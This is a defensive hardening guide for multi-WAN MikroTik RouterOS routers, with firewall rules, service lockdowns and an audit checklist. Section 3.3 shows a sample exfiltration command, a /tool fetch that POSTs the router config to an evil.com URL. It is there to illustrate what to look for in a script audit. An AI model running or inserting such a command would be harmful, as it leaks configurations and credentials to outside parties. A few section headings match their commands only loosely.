# Overlooked Security — Rarely Addressed Threats

> Security gaps that standard hardening guides miss in Multi-WAN MikroTik deployments.

---

## Category 1 — Management Plane

### 1.1 Winbox on WAN (Still #1 in 2025)

Most compromised MikroTik routers have Winbox accessible from internet. Even patched routers are brute-forced.

```
# Verify Winbox is NOT reachable from WAN
/ip firewall filter
add chain=input in-interface-list=WAN protocol=tcp dst-port=8291 action=drop \
    comment="BLOCK Winbox WAN" place-before=0

/ip service print
# winbox address must NOT be 0.0.0.0/0
```

### 1.2 MAC-Winbox (Layer 2 Discovery)

Winbox discovers routers via **MNDP** (port 5678 UDP) and **MAC-Telnet** (port 20561). Attackers on the same L2 segment can discover and access routers even without IP.

```
/tool mac-server
set allowed-interface-list=none

/tool mac-server mac-winbox
set allowed-interface-list=none

/tool bandwidth-server
set enabled=no
```

### 1.3 RoMON (Router Management Overlay Network)

RoMON creates a hidden management mesh. Rarely disabled, often exploited for lateral movement.

```
/tool romon
set enabled=no
```

### 1.4 REST API Exposure (RouterOS 7)

```
/ip service print
# api-ssl should be disabled or restricted
/ip service set api-ssl disabled=yes
# If needed:
/ip service set api-ssl address=192.168.1.0/24 certificate=your-cert
```

### 1.5 Default SNMP Community

```
/snmp community print
# NEVER leave "public" or "private"
/snmp community set [find name=public] disabled=yes
/snmp community add name=monitoring addresses=192.168.1.0/24 security=authorized
```

---

## Category 2 — Multi-WAN Specific

### 2.1 DNS Resolver Open on All WAN IPs

Each WAN public IP can receive DNS queries if `allow-remote-requests=yes` without filtering.

```
/ip dns set allow-remote-requests=yes
/ip firewall filter
add chain=input in-interface-list=WAN protocol=udp dst-port=53 action=drop \
    comment="No DNS from WAN"
add chain=input in-interface-list=WAN protocol=tcp dst-port=53 action=drop
```

### 2.2 NTP Amplification via All WANs

```
/ip firewall filter
add chain=input in-interface-list=WAN protocol=udp dst-port=123 action=drop
/system ntp client set enabled=yes
# NTP client only — not server
```

### 2.3 Bandwidth Test Port (TCP 2000)

MikroTik bandwidth-test is a common DDoS amplification vector.

```
/ip firewall filter
add chain=input in-interface-list=WAN protocol=tcp dst-port=2000 action=drop
/tool bandwidth-server set enabled=no
```

### 2.4 BGP Session Without Authentication

```
/routing bgp connection
# Always set password:
set isp1 password=strong-bgp-md5-password
```

### 2.5 PCC Mangle Information Leakage

Connection marks reveal which WAN a user uses. An insider can infer ISP path from mark names. Use non-descriptive marks in high-security environments:

```
# Instead of "WAN1-conn" use:
new-connection-mark=0x1A
```

### 2.6 Asymmetric Firewall — IPv6 Forgotten

Most Multi-WAN hardening covers IPv4 only. IPv6 bypasses all rules if `/ipv6 firewall` is empty.

```
/ipv6 firewall filter
add chain=input connection-state=established,related action=accept
add chain=input in-interface-list=WAN action=drop
add chain=forward in-interface-list=WAN connection-state=new action=drop
```

---

## Category 3 — Automation Attack Surface

### 3.1 Netwatch Script Injection

If Netwatch monitors a host controlled by an attacker, `down-script` and `up-script` execute with router privileges.

**Rule:** Never monitor untrusted external hosts in Netwatch scripts. Use gateway IPs only.

### 3.2 Scheduler Scripts with Global Variables

```
/system script print
# Review ALL scripts for:
# - fetch commands to external URLs
# - user creation
# - firewall rule modification
# - unauthorized /tool e-mail send
```

### 3.3 Fetch Command Data Exfiltration

```
# DANGEROUS — exfiltrates config to external server:
/tool fetch url="http://evil.com/collect" http-method=post http-data=$config

# Audit:
/system script print
/tool fetch print
```

### 3.4 DHCP Client Script Execution

DHCP client scripts run on every lease renewal. Compromised DHCP server can inject commands.

```
/ip dhcp-client print
# Review all scripts= parameters
```

---

## Category 4 — Data Protection

### 4.1 Config Export Contains Plaintext Secrets

```
/export file=test
# File contains: password=, secret=, pre-shared-key= in plaintext
```

**Policy:**
- Encrypt `.rsc` files before offsite storage
- Use password vault for credentials, not config files
- Prefer `/system backup save` (binary) over `/export` for backups

### 4.2 Hotspot User Database

```
/ip hotspot user print
# Passwords stored in plaintext
/ip hotspot user export file=hotspot-users
# This file is a security risk
```

### 4.3 IPsec PSK in Config

```
/ip ipsec identity print
# secret= visible in export
# Use certificate-based authentication for production VPN
```

### 4.4 Cloud Backup (MikroTik cloud.sync)

If enabled, config syncs to MikroTik cloud. Review whether this meets your data sovereignty requirements.

```
/system backup cloud print
```

---

## Category 5 — Network Layer

### 5.1 IP Spoofing from LAN

Without strict filtering, LAN clients can spoof source IPs to manipulate PCC classification.

```
/ip firewall filter
add chain=forward in-interface-list=LAN src-address=!192.168.1.0/24 action=drop \
    comment="Anti-spoof LAN"
```

### 5.2 Neighbor Discovery (MNDP/CDP)

Router broadcasts its identity on all interfaces including WAN.

```
/ip neighbor discovery-settings
set discover-interface-list=LAN
set protocol=none
# Or restrict to LAN only
```

### 5.3 UPnP (if enabled)

```
/ip upnp
print
# Should be disabled on edge routers
set enabled=no
```

### 5.4 Proxy ARP on WAN

Can cause ARP spoofing and man-in-the-middle on shared WAN segments.

```
/interface print
# verify proxy-arp=disabled on WAN interfaces
/interface set ether1 arp=enabled
# NOT proxy-arp
```

### 5.5 ICMP Redirect Attacks

```
/ip settings
set accept-redirects=no
set accept-source-route=no
set allow-fast-path=no
```

---

## Category 6 — Physical & Supply Chain

### 6.1 Console Port Access

Serial console provides full access without network authentication. Physical rack security is mandatory.

### 6.2 RouterBOARD Bootloader Password

```
/system routerboard settings
set boot-device=try-ethernet-once-then-nand
# Prevent netboot from untrusted source
```

### 6.3 Netinstall Exposure

Router in netboot mode accepts any RouterOS image from network. Restrict PXE/Netinstall to management VLAN.

### 6.4 Counterfeit Hardware

Purchase only from authorized MikroTik distributors. Counterfeit CCR units have been found with modified bootloaders.

---

## Category 7 — Compliance & Auditing

### 7.1 Logging Gaps

Most deployments do not log firewall drops from WAN. Enable temporarily during audits:

```
/ip firewall filter
add chain=input in-interface-list=WAN action=log log-prefix="AUDIT-WAN-IN" \
    comment="Temporary audit rule — disable after review"
```

### 7.2 No Change Management

Every `/import` or manual change should be logged with engineer name, date, and reason.

### 7.3 Password Rotation

RouterOS has no password expiry. Implement quarterly rotation policy manually.

### 7.4 Two-Factor Authentication

RouterOS 7 supports SSH key authentication. Use keys instead of passwords for SSH:

```
/user ssh-keys import public-key-file=id_rsa.pub user=admin
/ip service set ssh auth-methods=publickey
```

---

## Overlooked Security Checklist

| # | Item | Often Missed | ☐ |
|---|------|-------------|---|
| 1 | Winbox blocked from WAN | Yes | ☐ |
| 2 | MAC-Winbox disabled | Yes | ☐ |
| 3 | RoMON disabled | Yes | ☐ |
| 4 | Bandwidth-server disabled | Yes | ☐ |
| 5 | IPv6 firewall configured | Yes | ☐ |
| 6 | DNS blocked from WAN | Yes | ☐ |
| 7 | NTP blocked from WAN | Yes | ☐ |
| 8 | SNMP community changed | Yes | ☐ |
| 9 | BGP password set | Yes | ☐ |
| 10 | Netwatch scripts audited | Yes | ☐ |
| 11 | Scheduler scripts audited | Yes | ☐ |
| 12 | Config exports encrypted | Yes | ☐ |
| 13 | MNDP restricted to LAN | Yes | ☐ |
| 14 | Proxy ARP disabled on WAN | Yes | ☐ |
| 15 | ICMP redirects disabled | Yes | ☐ |
| 16 | LAN anti-spoof rules | Yes | ☐ |
| 17 | SSH key auth enabled | Yes | ☐ |
| 18 | RouterOS on latest stable | Yes | ☐ |
| 19 | No default/weak users | Yes | ☐ |
| 20 | Physical console secured | Yes | ☐ |

---

**[← CVE Reference](cve-exploit-reference.md)** | **[Lab Exercises →](lab-exercises.md)**
